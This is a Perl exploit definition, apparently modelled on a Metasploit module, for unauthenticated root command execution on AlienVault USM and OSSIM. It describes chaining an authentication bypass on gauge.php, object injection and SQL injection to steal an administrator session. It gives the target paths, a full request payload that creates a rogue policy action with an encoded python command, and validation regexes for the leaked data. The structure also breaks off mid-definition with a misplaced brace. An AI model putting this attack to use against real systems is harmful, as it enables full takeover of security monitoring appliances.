my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits object injection, authentication bypass and ip spoofing vulnerabilities all together.

        Unauthenticated users can execute arbitrary commands under the context of the root user.



        By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability

        which leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue

        action and policy that enables to execute operating system commands by using captured session token. As a final step,

        SSH login attempt with an invalid credentials can trigger a created rogue policy which triggers an action that executes

        operating system command with root user privileges.



        This module was tested against following product and versions:

        AlienVault USM 5.3.0, 5.2.5, 5.0.0, 4.15.11, 4.5.0

        AlienVault OSSIM 5.0.0, 4.6.1

      ",
  METHOD => "GET",
  MSF_MODULE => "alienvault_exec",
  PATH => "ossim/action/modifyactions.php?page=1&rp=2000&m_opt=configuration&sm_opt=threat_intelligence&h_opt=policy&what=policies&back=../policy/policy.php&",
  PATHS => [
    "ossim/dashboard/sections/widgets/data/gauge.php",
    "ossim/dashboard/sections/widgets/data/gauge.php",
    "ossim/action/modifyactions.php",
    "",
  ],
  PAYLOAD => "id=&action=new&old_name=&action_name=__ACTION_NAME__&ctx=&old_descr=&descr=__DESCR__&action_type=2&only=on&cond=True&email_from=&email_to=email;email;email&email_subject=&email_message=&transferred_user=&transferred_entity=&exec_command=python-c\\__PAYLOAD\\.ENCODED__\\&descr=__DESCR__&active=1&group=__GROUP__&ctx=__CTX__&order=1&action=new&sources[]=00000000000000000000000000000000&dests[]=00000000000000000000000000000000&portsrc[]=0&portdst[]=0&plug_type=1&plugins[0]=on&taxfilters[]=25\@2\@0&tax_pt=0&tax_cat=0&tax_subc=0&mboxs[]=00000000000000000000000000000000&rep_act=0&rep_sev=1&rep_rel=1&rep_dir=0&ev_sev=1&ev_rel=1&tzone=Europe/Istanbul&date_type=1&begin_hour=0&begin_minute=0&begin_day_week=1&begin_day_month=1&begin_month=1&end_hour=23&end_minute=59&end_day_week=7&end_day_month=31&end_month=12&actions[]=__ACTIONS[]__&sim=1&priority=1&qualify=1&correlate=0&cross_correlate=0&store=0&",
  REFERENCES => [
    "https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/",
  ],
  VARIABLES => {
    'CTX' =>       { DESCRIPTION => "", VALUE => "" },
    'DESCR' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The URI of the vulnerable Alienvault OSSIM instance",
  VALUE => "/",
},
    'VALUE' =>       { DESCRIPTION => "", VALUE => "" },
    'ACTION_NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'ACTIONS[]' =>       { DESCRIPTION => "", VALUE => "" },
    'HEIGHT' =>       { DESCRIPTION => "", VALUE => "" },
    'GROUP' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       (
  "XPATH syntax error: ':::\\(.*\\):::'",
  "actionform\\.php\\?id=\\(.*\\)'><\\",
  "getpolicy\\.php\\?ctx=\\(.*\\)\\&group=\\(.*\\)',",
),
    'TSTRING' =>       "XPATH syntax error: ':'",
